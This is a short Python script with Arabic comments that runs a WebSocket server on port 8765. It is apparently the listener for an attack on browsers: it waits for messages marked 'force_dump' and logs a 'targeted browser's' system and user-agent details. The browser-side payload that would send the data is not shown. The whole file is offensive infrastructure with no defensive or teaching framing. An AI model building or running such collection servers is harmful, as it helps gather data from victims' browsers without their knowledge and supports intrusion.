import asyncio
import websockets
import json

async def handler(websocket, path):
    async for message in websocket:
        try:
            data = json.loads(message)
            if data.get('action') == 'force_dump':
                print("[+] تم الاتصال بنجاح من المتصفح المستهدف!")
                print(f"[+] معلومات النظام والمتصفح: {data.get('ua')}")
        except Exception as e:
            print(f"[-] خطأ في معالجة البيانات: {e}")

async def main():
    # تشغيل سيرفر الـ WebSocket على المنفذ 8765
    async with websockets.serve(handler, "0.0.0.0", 8765):
        print("[*] خادم الاستقبال يعمل الآن على المنفذ 8765...")
        await asyncio.Future()  # تشغيل دائم للخادم

if __name__ == '__main__':
    asyncio.run(main())
